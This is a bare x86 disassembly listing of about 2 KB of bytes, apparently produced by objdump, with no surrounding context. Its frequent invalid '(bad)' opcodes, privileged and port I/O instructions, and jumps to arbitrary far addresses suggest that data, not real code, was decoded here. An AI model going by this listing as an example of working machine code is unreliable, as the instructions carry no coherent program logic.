  434fdd:	repnz out dx,eax
  434fdf:	add    DWORD PTR [eax],eax
  434fe1:	add    BYTE PTR [eax],al
  434fe3:	add    BYTE PTR [eax],al
  434fe5:	add    dl,dh
  434fe7:	jmp    0xef7c5c1e
  434fec:	sbb    DWORD PTR [eax],eax
  434fee:	mov    edx,0x8d749178
  434ff3:	ret    0x8b3d
  434ff6:	nop
  434ff7:	jg     0x435027
  434ff9:	adc    al,0xbe
  434ffb:	loopne 0x434ff0
  434ffd:	je     0x434fb3
  434fff:	adc    ebp,DWORD PTR [eax-0x29]
  435002:	push   0x4ff9f542
  435007:	mov    ds,WORD PTR [edi+edi*8-0x1f]
  43500b:	or     BYTE PTR [ecx+0x65640afe],bh
  435011:	xor    al,0x4d
  435013:	repz popa 
  435015:	inc    eax
  435016:	nop
  435017:	mov    gs,WORD PTR [ebx]
  435019:	call   edi
  43501b:	loope  0x435010
  43501d:	push   edx
  43501e:	xchg   esp,eax
  43501f:	rcl    BYTE PTR [ebp+edx*2+0x52],1
  435023:	pop    ss
  435024:	xadd   DWORD PTR [ecx-0x6ffff0e6],edx
  43502b:	xor    bl,BYTE PTR [edi-0x6]
  43502e:	dec    DWORD PTR [edi+0x1a8c3fab]
  435034:	lldt   WORD PTR [eax-0x1805b48e]
  43503b:	ja     0x43507a
  43503d:	test   esp,ebp
  43503f:	mov    ds:0x7713104d,eax
  435044:	add    dh,dl
  435046:	push   eax
  435047:	sbb    dh,BYTE PTR [edi]
  435049:	push   eax
  43504a:	add    BYTE PTR [eax],al
  43504c:	add    BYTE PTR [eax],al
  43504e:	add    bh,al
  435050:	pop    ebp
  435051:	jecxz  0x4350c5
  435053:	mov    ds:0xbef84dd8,eax
  435058:	or     edx,DWORD PTR [edx]
  43505a:	call   esi
  43505c:	push   ebp
  43505d:	repz xlat BYTE PTR ds:[ebx]
  43505f:	sbb    DWORD PTR [edi+ecx*1-0x75],0x55
  435064:	mov    bl,0xc7
  435066:	bswap  edi
  435068:	dec    ebp
  435069:	fcomip st,st(2)
  43506b:	mov    dl,0x1a
  43506d:	xadd   ebp,ecx
  435070:	sbb    eax,0xb2d30dda
  435075:	cmc    
  435076:	js     0x43504b
  435078:	and    ah,BYTE PTR ds:0xc425a1dc
  43507e:	out    0x4f,al
  435080:	cmc    
  435081:	enter  0xc303,0x3b
  435085:	sar    DWORD PTR [edx-0x2d],0xc2
  435089:	js     0x435062
  43508b:	mov    al,ds:0x88053520
  435090:	cmp    BYTE PTR [eax+esi*2-0x41176274],0xd3
  435098:	sub    al,BYTE PTR [ebp+edi*1+0x40bcb42f]
  43509f:	and    al,0xa
  4350a1:	call   0x3a78e0e8
  4350a6:	in     al,dx
  4350a7:	sub    eax,0x40b4c2
  4350ac:	and    bh,dl
  4350ae:	add    al,0x90
  4350b0:	out    dx,eax
  4350b1:	xor    eax,esi
  4350b3:	add    BYTE PTR [eax],al
  4350b5:	add    BYTE PTR [eax],al
  4350b7:	add    bh,ah
  4350b9:	ret    
  4350ba:	mov    eax,0x456e0b03
  4350bf:	push   ebx
  4350c0:	clc    
  4350c1:	and    BYTE PTR [ecx-0x1a],al
  4350c4:	jmp    0xe03a87c2
  4350c9:	jle    0x43512b
  4350cb:	xlat   BYTE PTR ds:[ebx]
  4350cc:	inc    edi
  4350cd:	add    DWORD PTR [ebx+0x70c2437a],0xf6710ed4
  4350d7:	daa    
  4350d8:	mov    ds:0x7328139e,eax
  4350dd:	sahf   
  4350de:	mov    eax,cr5
  4350e1:	out    0xe5,al
  4350e3:	outs   dx,DWORD PTR ds:[esi]
  4350e4:	xchg   esp,eax
  4350e5:	out    0xdd,al
  4350e7:	outs   dx,DWORD PTR ds:[esi]
  4350e8:	mov    dh,ah
  4350ea:	aad    0x6f
  4350ec:	mov    esi,fs
  4350ee:	mov    ebp,0xe3b9e70
  4350f3:	stos   DWORD PTR es:[edi],eax
  4350f4:	jg     0x43509c
  4350f6:	push   ss
  4350f7:	out    dx,al
  4350f8:	pop    ecx
  4350f9:	mov    al,0x97
  4350fb:	das    
  4350fc:	xchg   edx,eax
  4350fd:	sub    eax,0xb2e8ed58
  435102:	xchg   ebp,eax
  435103:	call   0xdda47add
  435108:	out    0x73,al
  43510a:	out    0x19,al
  43510c:	f2xm1  
  43510e:	shl    BYTE PTR [esp+edi*1],cl
  435111:	sub    DWORD PTR [eax],esi
  435113:	call   0xad9442ab
  435118:	dec    ebx
  435119:	mov    ch,0x4f
  43511b:	jmp    0x435120
  435120:	add    BYTE PTR [ebx+0x3d],bl
  435123:	jmp    0x28ab:0xd58c359e
  43512a:	daa    
  43512b:	inc    edx
  43512c:	bound  edi,QWORD PTR [eax]
  43512e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43512f:	cli    
  435130:	sbb    eax,0xeed533c6
  435135:	(bad)  
  435136:	cld    
  435137:	or     eax,0x612d93e9
  43513c:	fnstsw WORD PTR [esi+0x24]
  43513f:	sbb    ebp,DWORD PTR [ebp-0x2f]
  435142:	mov    cl,0xe
  435144:	jmp    0xbb95305b
  435149:	push   eax
  43514a:	and    BYTE PTR [edx-0xe],0x66
  43514e:	jae    0x43510a
  435150:	cdq    
  435151:	cmp    DWORD PTR [edx+0x19db9499],esi
  435157:	hlt    
  435158:	mov    DWORD PTR [esi+0x3f219728],ebp
  43515e:	out    dx,eax
  43515f:	pusha  
  435160:	out    dx,al
  435161:	pop    ecx
  435162:	es cmc 
  435164:	dec    ebx
  435165:	xchg   esp,eax
  435166:	mov    dl,0xe
  435168:	bound  esp,QWORD PTR [edi-0x46]
  43516b:	(bad)  
  43516c:	adc    DWORD PTR [ebp+0x390093b9],esp
  435172:	scas   al,BYTE PTR es:[edi]
  435173:	push   cs
  435174:	add    BYTE PTR [esi+0x612b8fc6],cl
  43517a:	jae    0x43518a
  43517c:	mov    ebp,DWORD PTR [eax]
  43517e:	sub    dh,BYTE PTR [eax]
  435180:	jg     0x435175
  435182:	sbb    cl,BYTE PTR [ecx]
  435184:	jmp    0x435186
  435186:	add    BYTE PTR [eax],al
  435188:	add    BYTE PTR [eax],al
  43518a:	lock stos DWORD PTR es:[edi],eax
  43518c:	sub    eax,DWORD PTR [edx+edx*2]
  43518f:	xchg   esi,eax
  435190:	imul   esp,DWORD PTR [esi],0xf7b0b69
  435196:	(bad)  
  435197:	jo     0x435197
  435199:	jmp    0xb6b:0x419e1fe0
  4351a0:	dec    ecx
  4351a1:	shufps xmm6,XMMWORD PTR [eax+0x1a],0xa8
  4351a6:	sub    edx,DWORD PTR [esi+0x70c60f10]
  4351ac:	add    ch,bl
  4351ae:	fs icebp 
  4351b0:	cmc    
  4351b1:	add    ebp,DWORD PTR [edx+0x5cebe869]
  4351b7:	xor    ebx,DWORD PTR [eax]
  4351b9:	jmp    DWORD PTR [edx]
  4351bb:	in     al,dx
  4351bc:	loopne 0x4351ff
  4351be:	in     eax,dx
  4351bf:	and    eax,0x56de065f
  4351c4:	sub    edx,DWORD PTR [esi]
  4351c6:	(bad)  
  4351c7:	int    0x69
  4351c9:	enter  0xa4e,0x1d
  4351cd:	clts   
  4351cf:	jno    0x4351d5
  4351d1:	jmp    0x43524b
  4351d3:	pop    ds
  4351d4:	sahf   
  4351d5:	inc    ecx
  4351d6:	in     eax,dx
  4351d7:	or     dh,BYTE PTR [ecx]
  4351d9:	cmovbe esi,DWORD PTR [eax+0x6]
  4351dd:	add    edi,DWORD PTR [eax+0xa]
  4351e0:	or     edi,eax
  4351e2:	mov    bh,0x39
  4351e4:	jp     0x435226
  4351e6:	test   eax,0x460f070a
  4351eb:	jo     0x435207
  4351ed:	test   DWORD PTR [eax],0x0
  4351f3:	nop
  4351f4:	jmp    0x4351bc
  4351f6:	adc    BYTE PTR [edi-0x2ef3af84],cl
  4351fc:	ret    
  4351fd:	jmp    0x4351e3
  4351ff:	xchg   edi,eax
  435200:	adc    al,0xba
  435202:	aas    
  435203:	xchg   esp,eax
  435204:	fcmovb st,st(7)
  435206:	add    edx,DWORD PTR [ebx]
  435208:	mov    ebx,0xc88e8710
  43520d:	shl    ch,cl
  43520f:	xchg   edi,eax
  435210:	sub    ebp,0xf07192e5
  435216:	pop    eax
  435217:	mov    esi,0x9008d452
  43521c:	sahf   
  43521d:	pop    ecx
  43521e:	add    BYTE PTR [ebx],ah
  435220:	cld    
  435221:	push   ebx
  435222:	add    BYTE PTR ds:0xf7005404,ah
  435228:	sti    
  435229:	push   ebx
  43522a:	add    ch,ah
  43522c:	and    edx,DWORD PTR [eax+eax*1-0x1d]
  435230:	sbb    edx,DWORD PTR [eax+eax*1-0xe]
  435234:	and    edx,DWORD PTR [eax+eax*1+0x4e]
  435238:	sbb    al,0x54
  43523a:	add    BYTE PTR [edi],dh
  43523c:	add    al,0x54
  43523e:	add    ch,dh
  435240:	sti    
  435241:	push   ebx
  435242:	add    bl,bh
  435244:	add    edx,DWORD PTR [eax+eax*1+0x32]
  435248:	cld    
  435249:	push   ebx
  43524a:	add    BYTE PTR [ebx],al
  43524c:	and    al,0x54
  43524e:	add    bl,ch
  435250:	sbb    edx,DWORD PTR [eax+eax*1-0x6d]
  435254:	and    edx,DWORD PTR [eax+eax*1+0x0]
  435258:	add    BYTE PTR [eax],al
  43525a:	add    BYTE PTR [eax],al
  43525c:	mov    WORD PTR [ebx],fs
  43525e:	push   esp
  43525f:	add    cl,cl
  435261:	add    edx,DWORD PTR [eax+eax*1+0x61]
  435265:	mov    ds:0x9693243e,eax
  43526a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43526b:	je     0x435297
  43526d:	cmp    eax,0xb26c749c
  435272:	loope  0x4351fc
  435274:	mov    ds:0x2a86959d,al
  435279:	scas   al,BYTE PTR es:[edi]
  43527a:	cmc    
  43527b:	pop    ecx
  43527c:	inc    esi
  43527d:	jge    0x4352ef
  43527f:	pop    esi
  435280:	mov    ecx,fs
  435282:	iret   
  435283:	jmp    0x43527b
  435285:	mov    ds:0xf78e2ec,al
  43528a:	call   0x2d7bcc70
  43528f:	(bad)  
  435290:	(bad)  
  435291:	into   
  435292:	in     eax,0x88
  435294:	push   edi
  435295:	lahf   
  435296:	or     al,0x37
  435298:	mov    ch,0x7
  43529a:	inc    BYTE PTR [ecx-0x6c]
  43529d:	pushf  
  43529e:	add    edi,DWORD PTR [ecx]
  4352a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4352a1:	adc    eax,0xaf984960
  4352a6:	mov    dl,0x86
  4352a8:	enter  0xf6ae,0x58
  4352ac:	call   0xb4b2:0x85283932
  4352b3:	adc    ebp,DWORD PTR [ecx]
  4352b5:	mov    ds:0x7d266ddd,eax
  4352ba:	or     DWORD PTR [eax],ecx
  4352bc:	mov    dh,0xb1
  4352be:	nop
  4352bf:	add    eax,0x0
  4352c4:	add    BYTE PTR [esi-0x634824e],ch
  4352ca:	and    al,0x6c
  4352cc:	mov    ss,WORD PTR [esi+ecx*8-0x43]
  4352d0:	inc    esi
  4352d1:	jge    0x4352c0
  4352d3:	enter  0x5a1e,0xae
  4352d7:	(bad)  
  4352d8:	ror    DWORD PTR [ebx-0x79],1
  4352db:	lods   al,BYTE PTR ds:[esi]
  4352dc:	inc    ecx
  4352dd:	aas    
  4352de:	lock clc 
  4352e0:	add    ecx,DWORD PTR [ebp+0x7c]
  4352e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4352e4:	mov    ds,WORD PTR [ebx-0x6fb8400e]
  4352ea:	sbb    bl,BYTE PTR [ebp+0x2a]
  4352ed:	leave  
  4352ee:	and    ecx,DWORD PTR [esi]
  4352f0:	bound  esp,QWORD PTR [edi-0x32]
  4352f3:	(bad)  
  4352f4:	(bad)  
  4352f5:	sti    
  4352f6:	cs (bad) 
  4352f8:	popf   
  4352f9:	scas   eax,DWORD PTR es:[edi]
  4352fa:	xor    ah,ah
  4352fc:	xchg   ebp,eax
  4352fd:	stos   DWORD PTR es:[edi],eax
  4352fe:	or     esp,DWORD PTR [edx+0x1a]
  435301:	mov    cl,0x29
  435303:	xchg   ecx,eax
  435304:	sub    DWORD PTR [edi],edi
  435306:	mov    ecx,0xd597b797
  43530b:	sbb    al,0x93
  43530d:	lea    esi,[ebx-0x69]
  435310:	and    DWORD PTR [ebx-0x18],ebp
  435313:	fucomp st(7)
  435315:	jno    0x435297
  435317:	jmp    0x4352d7
  435319:	sbb    eax,0xc8c29222
  43531e:	scas   eax,DWORD PTR es:[edi]
  43531f:	div    BYTE PTR [ebx+0x2eeb29a9]
  435325:	add    eax,0x224bf0
  43532a:	add    BYTE PTR [eax],al
  43532c:	add    BYTE PTR [eax],al
  43532e:	push   esi
  43532f:	scas   al,BYTE PTR es:[edi]
  435330:	push   cs
  435331:	adc    al,0x15
  435333:	push   ss
  435334:	aas    
  435335:	pop    ds
  435336:	or     eax,0xc842d6df
  43533b:	mov    dl,0xf6
  43533d:	in     eax,0x78
  43533f:	sub    ebx,ebp
  435341:	jae    0x435327
  435343:	sub    eax,0x298f1dc7
  435348:	popa   
  435349:	stc    
  43534a:	add    al,0x7f
  43534c:	push   ss
  43534d:	cmp    BYTE PTR [ebx-0xe81f5e6],dl
  435353:	sub    bl,ch
  435355:	cld    
  435356:	pop    es
  435357:	sub    ah,BYTE PTR [ecx-0x27]
  43535a:	lock sahf 
  43535c:	sbb    ah,BYTE PTR [esi+0x47]
  43535f:	mov    edx,0x221537eb
  435364:	xchg   edx,eax
  435365:	xor    bh,BYTE PTR [eax]
  435367:	scas   eax,DWORD PTR es:[edi]
  435368:	div    BYTE PTR [edi-0x57]
  43536b:	sub    ebx,ebp
  43536d:	add    BYTE PTR [edx-0x8],al
  435370:	inc    edi
  435371:	pop    ebx
  435372:	and    al,0xed
  435374:	std    
  435375:	call   FWORD PTR [esi+esi*1]
  435378:	cli    
  435379:	push   ebx
  43537a:	pop    ds
  43537b:	ss pop ds
  43537d:	rol    BYTE PTR [edx],1
  43537f:	imul   ecx,DWORD PTR [esi],0xffffffe8
  435382:	jno    0x43535c
  435384:	in     eax,0xff
  435386:	xchg   BYTE PTR [ebx+0x2],bh
  435389:	mov    ah,BYTE PTR [ecx+0x11]
  43538c:	pop    edi
  43538d:	adc    BYTE PTR [esi+0xff1a89],dl
  435393:	add    BYTE PTR [eax],al
  435395:	add    BYTE PTR [eax],al
  435397:	cld    
  435398:	lods   eax,DWORD PTR ds:[esi]
  435399:	in     eax,0xd6
  43539b:	repnz push es
  43539d:	xchg   edx,eax
  43539e:	(bad)  
  4353a0:	sbb    edx,DWORD PTR [eax-0x1a4e330a]
  4353a6:	jne    0x43541d
  4353a8:	das    
  4353a9:	aas    
  4353aa:	or     BYTE PTR [ebx-0x13],bh
  4353ad:	cmc    
  4353ae:	les    eax,FWORD PTR [edi+0x13]
  4353b1:	in     eax,0xe8
  4353b3:	stos   DWORD PTR es:[edi],eax
  4353b4:	retf   
  4353b5:	in     eax,0xff
  4353b7:	ret    0x47eb
  4353ba:	pop    ebx
  4353bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4353bc:	clc    
  4353bd:	std    
  4353be:	call   FWORD PTR [edi+ebp*1-0x2397ae06]
  4353c5:	cmp    eax,0x3e126c8d
  4353ca:	push   0x31
  4353cc:	in     eax,0x91
  4353ce:	cli    
  4353cf:	cmp    bh,ah
  4353d1:	in     al,0x15
  4353d3:	popf   
  4353d4:	sub    eax,DWORD PTR es:[eax]
  4353d7:	ins    BYTE PTR es:[edi],dx
  4353d8:	cmc    
  4353d9:	popa   
  4353da:	cmp    dh,BYTE PTR [edx+0x70]
  4353dd:	jmp    0x62ff:0xe87705e8
  4353e4:	add    eax,0xd6bdf68f
  4353e9:	(bad)  
  4353ea:	call   DWORD PTR [eax+0x4d8b0dff]
  4353f0:	sbb    DWORD PTR [edi],0x66
  4353f3:	xchg   esp,eax
  4353f4:	inc    eax
  4353f5:	jns    0x435403
  4353f7:	(bad)  
  4353f8:	retfw  
  4353fa:	stc    
  4353fb:	add    BYTE PTR [eax],al
  4353fd:	add    BYTE PTR [eax],al
  4353ff:	add    BYTE PTR [ebp-0x6fc020fd],ah
  435405:	xchg   esi,eax
  435406:	iret   
  435407:	jae    0x4353a2
  435409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43540a:	mov    ebp,0xee2ee4e8
  43540f:	stc    
  435410:	arpl   cx,ax
  435412:	out    dx,al
  435413:	jae    0x4353a9
  435415:	mov    al,0xe4
  435417:	pop    edi
  435418:	mov    ds:0x1b590f4b,al
  43541d:	(bad)  [ebp-0x39]
  435420:	push   ebx
  435421:	ds call 0xc64c:0xec1f13ec
  435429:	loopne 0x43542a
  43542b:	icebp  
  43542c:	mov    esi,0x39851685
  435431:	or     ch,ah
  435433:	pop    es
  435434:	or     bl,0x12
  435437:	test   DWORD PTR [eax-0x74],ecx
  43543a:	(bad)  
  43543c:	mov    esi,ebx
  43543e:	inc    ebp
  43543f:	cs or  eax,0xdf50f6ce
  435445:	pop    eax
  435446:	push   ebp
  435447:	in     al,0x8c
  435449:	or     ecx,DWORD PTR [edi]
  43544b:	add    BYTE PTR [edi],ah
  43544d:	es femms 
  435450:	ror    BYTE PTR [ebx],1
  435452:	clc    
  435453:	mulps  xmm1,xmm6
  435456:	ret    0x9173
  435459:	sar    DWORD PTR [ebp+0x43],1
  43545c:	in     al,dx
  43545d:	mov    edx,0xfa5f923
  435462:	fnstsw WORD PTR [edi]
  435464:	add    BYTE PTR [eax],al
  435466:	add    BYTE PTR [eax],al
  435468:	add    BYTE PTR [eax-0x48c2d6a],dl
  43546e:	mov    cl,0xac
  435470:	fiadd  WORD PTR [ebx-0x6fbc186e]
  435476:	sub    eax,0x7d3a3f3b
  43547b:	cs ret 
  43547d:	arpl   WORD PTR ds:0xc5b48341,bp
  435483:	jp     0x4354ce
  435485:	mov    esp,0x60368b84
  43548a:	in     eax,0x0
  43548c:	xor    esi,DWORD PTR [esi]
  43548e:	shl    BYTE PTR [eax-0x2b],cl
  435491:	test   eax,0x5ff2e9c6
  435496:	mov    dl,0xa5
  435498:	fiadd  WORD PTR [ebx-0x6fbc1ace]
  43549e:	xor    eax,0x2da25935
  4354a3:	mov    dl,0xdf
  4354a5:	loopne 0x435433
  4354a7:	aad    0x69
  4354a9:	jns    0x4354cb
  4354ab:	ret    0x8067
  4354ae:	jb     0x4354a5
  4354b0:	mov    BYTE PTR [eax-0x5a],dl
  4354b3:	icebp  
  4354b4:	adc    DWORD PTR [eax+0xc],edx
  4354b7:	xor    BYTE PTR [ecx+0x132522d3],dl
  4354bd:	dec    ecx
  4354be:	mov    DWORD PTR [ebx+esi*1],edi
  4354c1:	setle  cl
  4354c4:	(bad)  
  4354c5:	rcr    DWORD PTR [edx],cl
  4354c7:	test   DWORD PTR [ebx],0xf8bcb290
  4354cd:	add    BYTE PTR [eax],al
  4354cf:	add    BYTE PTR [eax],al
  4354d1:	add    BYTE PTR [edi],ch
  4354d3:	mov    al,0x35
  4354d5:	add    al,0x13
  4354d7:	repz add BYTE PTR [ebx],ah
  4354da:	int    0x83
  4354dc:	sub    BYTE PTR [ecx+0x33250ed3],dl
  4354e2:	or     DWORD PTR [esi-0x5d5c216f],esp
  4354e8:	lds    eax,FWORD PTR [ebx-0x70]
  4354eb:	xor    eax,0xac5fa90e
  4354f0:	jmp    0x4354c6
  4354f2:	arpl   WORD PTR [eax+0x6496e94e],si
  4354f8:	(bad)  
  4354f9:	shr    DWORD PTR fs:[ecx-0x5c49c9ae],cl
  435500:	jmp    0x93a9:0x7fc84e
  435507:	cmp    bh,cl
  435509:	sahf   
  43550a:	jge    0x435491
  43550c:	aad    0x2a
  43550e:	js     0x435545
  435510:	cli    
  435511:	cwde   
  435512:	fs ins DWORD PTR es:[edi],dx
  435514:	cdq    
  435515:	lods   al,BYTE PTR ds:[esi]
  435516:	retf   
  435517:	cmp    BYTE PTR [eax-0xf],0x29
  43551b:	sbb    DWORD PTR [edi],ebx
  43551d:	xor    dh,BYTE PTR [esi-0x2c068d3d]
  435523:	mov    dl,0x91
  435525:	sub    DWORD PTR [esi-0x6c167eca],edx
  43552b:	mov    dl,0x99
  43552d:	lods   al,BYTE PTR ds:[esi]
  43552e:	push   edi
  43552f:	cmp    BYTE PTR [edi],0x9a
  435532:	stc    
  435533:	(bad)  
  435534:	jmp    0x435592
  435536:	add    BYTE PTR [eax],al
  435538:	add    BYTE PTR [eax],al
  43553a:	add    BYTE PTR [ecx+ebx*1+0x1],al
  43553e:	add    DWORD PTR [edi+ebx*8+0xe],esp
  435542:	ins    BYTE PTR es:[edi],dx
  435543:	dec    esp
  435544:	mov    ds:0x2f47ce63,eax
  435549:	add    BYTE PTR [ecx],ch
  43554b:	mov    WORD PTR [ebp-0x7118bc1a],ds
  435551:	xchg   edi,eax
  435552:	and    al,0x30
  435554:	xor    edx,ebp
  435556:	xor    eax,0x3cf684b7
  43555b:	mov    al,ds:0x4472eb19
  435560:	xor    esp,esp
  435562:	sbb    eax,0x8d512b54
  435567:	les    ebx,FWORD PTR [ecx]
  435569:	popa   
  43556a:	add    BYTE PTR ds:0x7e1974e8,cl
  435570:	xchg   esi,esp
  435572:	call   esp
  435574:	sbb    bl,BYTE PTR [ebx]
  435576:	inc    eax
  435577:	stc    
  435578:	aaa    
  435579:	into   
  43557a:	je     0x43552f
  43557c:	std    
  43557d:	pop    ds
  43557e:	jmp    esp
  435580:	jle    0x435580
  435582:	aas    
  435583:	jmp    0xcfb823bf
  435588:	sub    BYTE PTR [esi],cl
  43558a:	test   BYTE PTR [ecx+0x7a],bh
  43558d:	ss cmova esi,esi
  435591:	push   ebp
  435592:	push   eax
  435593:	jle    0x43555d
  435595:	in     eax,0x15
  435597:	shl    DWORD PTR [edx],1
  435599:	sub    eax,DWORD PTR [eax]
  43559b:	xor    al,0xf6
  43559d:	popa   
  43559e:	pop    ss
  43559f:	add    BYTE PTR [eax],al
  4355a1:	add    BYTE PTR [eax],al
  4355a3:	add    BYTE PTR [eax],ch
  4355a5:	mov    esi,0xb2a9200e
  4355aa:	jns    0x4355b0
  4355ac:	jmp    0xebe:0xf80bf1b1
  4355b3:	xor    BYTE PTR [ecx-0x4e],ch
  4355b6:	add    al,0xc0
  4355b8:	in     al,dx
  4355b9:	fsubp  st(1),st
  4355bb:	mov    cl,BYTE PTR [edi+0x6e6c0b0e]
  4355c1:	inc    DWORD PTR [edi-0x1]
  4355c4:	(bad)  
  4355c5:	(bad)  
  4355c6:	in     al,0x15
  4355c8:	leave  
  4355c9:	and    BYTE PTR [ebx],ch
  4355cb:	add    BYTE PTR [ebx-0x536bf0e],dh
  4355d1:	in     al,0x91
  4355d3:	in     al,dx
  4355d4:	cwde   
  4355d5:	xor    ebp,DWORD PTR [edi-0x4]
  4355d8:	sub    DWORD PTR [edx-0x4986b06e],ecx
  4355de:	in     eax,0x15
  4355e0:	mov    ecx,0xb4002b23
  4355e5:	icebp  
  4355e6:	popa   
  4355e7:	and    BYTE PTR [eax+0x50a31ab3],dl
  4355ed:	or     ebx,DWORD PTR [edi]
  4355ef:	stc    
  4355f0:	popf   
  4355f1:	imul   ebx,ebp,0x3f
  4355f4:	nop
  4355f5:	xchg   esi,eax
  4355f6:	iret   
  4355f7:	je     0x435599
  4355f9:	xchg   esi,eax
  4355fa:	pop    esp
  4355fb:	cld    
  4355fc:	inc    ecx
  4355fd:	mov    cl,0xc9
  4355ff:	stc    
  435600:	ror    BYTE PTR [esi-0x466b8c31],0xd2
  435607:	mov    DWORD PTR [eax],0x0
  43560d:	ror    DWORD PTR [eax-0x36f03b4],cl
  435613:	arpl   ax,ax
  435615:	fxch   st(0)
  435617:	mov    gs,esp
  435619:	pop    eax
  43561a:	inc    esi
  43561b:	and    DWORD PTR [ebp+0x2d7aaf3c],eax
  435621:	rcr    BYTE PTR [eax],1
  435623:	cld    
  435624:	push   ecx
  435625:	sbb    edx,edx
  435627:	jno    0x4355b0
  435629:	push   esp
  43562a:	neg    DWORD PTR [edx]
  43562c:	sbb    DWORD PTR [esi-0x2b9a17c2],0x7e
  435633:	push   ebx
  435634:	and    al,0xac
  435636:	ds pop ds
  435638:	stc    
  435639:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43563a:	sub    esp,ecx
  43563c:	aas    
  43563d:	nop
  43563e:	mov    bl,dl
  435640:	or     al,0x57
  435642:	push   edi
  435643:	xor    esp,DWORD PTR [eax]
  435645:	int3   
  435646:	or     ecx,DWORD PTR [edi]
  435648:	add    BYTE PTR ds:0xc0102ed7,cl
  43564e:	mov    es,eax
  435650:	mov    edx,esp
  435652:	mov    bh,0x2e
  435654:	or     ebp,ecx
  435656:	dec    ebp
  435657:	and    bh,cl
  435659:	les    esi,FWORD PTR [edi-0x503374be]
  43565f:	jmp    0x8c00:0xf0bb852
  435666:	mov    dl,0x2a
  435668:	xor    ebx,eax
  43566a:	aaa    
  43566b:	mov    WORD PTR [ebx],cs
  43566d:	shl    ebp,cl
  43566f:	and    al,0x31
  435671:	add    BYTE PTR [eax],al
  435673:	add    BYTE PTR [eax],al
  435675:	add    BYTE PTR [ecx],cl
  435677:	(bad)  
  435678:	pop    ecx
  435679:	cmc    
  43567a:	(bad)  
  43567b:	mov    dl,0x7a
  43567d:	les    eax,FWORD PTR [edx+eiz*8-0x5d539832]
  435684:	jmp    0x4b05cc7e
  435689:	inc    eax
  43568a:	lods   al,BYTE PTR ds:[esi]
  43568b:	(bad)  
  43568c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43568d:	fisub  DWORD PTR [esi+edx*8-0x13]
  435691:	jmp    0x43568f
  435693:	mov    BYTE PTR [ebx+ebx*8-0x4b],al
  435697:	mov    edi,0xc66c505c
  43569c:	pusha  
  43569d:	adc    DWORD PTR [eax],esi
  43569f:	shl    BYTE PTR [ebp+0x2403b903],0x50
  4356a6:	je     0x43566a
  4356a8:	cmp    al,0xb2
  4356aa:	or     eax,0xb4fbd976
  4356af:	scas   eax,DWORD PTR es:[edi]
  4356b0:	enter  0x39c3,0x7c
  4356b4:	mov    ds:0x377b5486,al
  4356b9:	or     BYTE PTR [eax-0x30179f7b],dl
  4356bf:	test   BYTE PTR [eax-0x1e89f42f],ch
  4356c5:	sbb    BYTE PTR [esi-0x5a],0xc6
  4356c9:	xor    al,0xf8
  4356cb:	mov    edx,0x8290439a
  4356d0:	mov    ebp,0xc41dff9f
  4356d5:	xchg   BYTE PTR [edi+ebp*4-0x30],dl
  4356d9:	repz add BYTE PTR [eax],al
  4356dc:	add    BYTE PTR [eax],al
  4356de:	add    ch,dl
  4356e0:	cmp    DWORD PTR ds:0xf572f320,0xe412833
  4356ea:	push   eax
  4356eb:	dec    eax
  4356ec:	sbb    cl,BYTE PTR [edi-0x31cedc5b]
  4356f2:	daa    
  4356f3:	pop    ds
  4356f4:	sbb    esp,DWORD PTR [ecx-0x7]
  4356f7:	push   es
  4356f8:	sub    dl,0x96
  4356fb:	pusha  
  4356fc:	scas   al,BYTE PTR es:[edi]
  4356fd:	jmp    0x435713
  4356ff:	xchg   esp,eax
  435700:	or     cl,BYTE PTR [esi+eax*4]
  435703:	ficomp DWORD PTR [ecx]
  435705:	xchg   edi,eax
  435706:	sub    al,0xd8
  435708:	xor    eax,0x94f181de
  43570d:	jmp    0x43577d
  43570f:	push   ss
  435710:	icebp  
  435711:	dec    ebx
  435712:	xor    ch,dl
  435714:	scas   al,BYTE PTR es:[edi]
  435715:	push   cs
  435716:	push   0xffffffef
  435718:	jle    0x435759
  43571a:	mov    esi,0xa9b1e63b
  43571f:	xchg   ebx,eax
  435720:	xor    ebx,DWORD PTR [edx+0xd]
  435723:	mov    ch,cl
  435725:	jmp    0x435765
  435727:	rcl    BYTE PTR [ebx+0x3593a8fd],0xc6
  43572e:	fs out 0xa9,al
  435731:	xchg   edx,eax
  435732:	inc    esp
  435733:	xchg   ebx,eax
  435734:	mov    dl,0xe
  435736:	mov    ah,0x61
  435738:	xor    eax,0xdb854921
  43573d:	push   cs
  43573e:	adc    ebx,0xe94e4f
  435744:	add    BYTE PTR [eax],al
  435746:	add    BYTE PTR [eax],al
  435748:	(bad)  
  435749:	sbb    esp,eax
  43574b:	jo     0x435704
  43574d:	(bad)  
  43574e:	add    al,BYTE PTR [ecx-0x16b1b055]
  435754:	sahf   
  435755:	sbb    esp,eax
  435757:	jb     0x4357c5
  435759:	xor    eax,0x30600552
  43575e:	into   
  43575f:	out    0xcf,al
  435761:	push   esp
  435762:	push   cs
  435763:	jmp    0x13c86fb
  435768:	inc    esi
  435769:	fwait
  43576a:	mov    WORD PTR [eax],es
  43576c:	sub    DWORD PTR [edi+0x269d7491],ebp
  435772:	ds push esi
  435774:	les    ebp,FWORD PTR [edx+0x32]
  435777:	sbb    al,0x58
  435779:	daa    
  43577a:	push   0x24
  43577c:	dec    ecx
  43577d:	cli    
  43577e:	mov    ebp,0xab1d41f7
  435783:	and    DWORD PTR [ebp+0x293302d2],ebp
  435789:	mov    WORD PTR [edx+0x66],ss
  43578c:	xor    BYTE PTR [edx+0x32],0x14
  435790:	je     0x435804
  435792:	xor    ch,BYTE PTR [esi+edi*2]
  435795:	out    0xe5,al
  435797:	adc    eax,0x2b20c9
  43579c:	push   0xfffffff2
  43579e:	sbb    DWORD PTR [ebp+0x5006bafd],ecx
  4357a4:	fs jb  0x4357d9
  4357a7:	sub    al,0x19
  4357a9:	cs push edx
  4357ab:	and    al,0x0
  4357ad:	add    BYTE PTR [eax],al
  4357af:	add    BYTE PTR [eax],al
  4357b1:	aad    0xe1
  4357b3:	test   DWORD PTR ds:[ecx-0x46da54e3],0xa4ffeb1a
  4357be:	scas   al,BYTE PTR es:[edi]
  4357bf:	push   cs
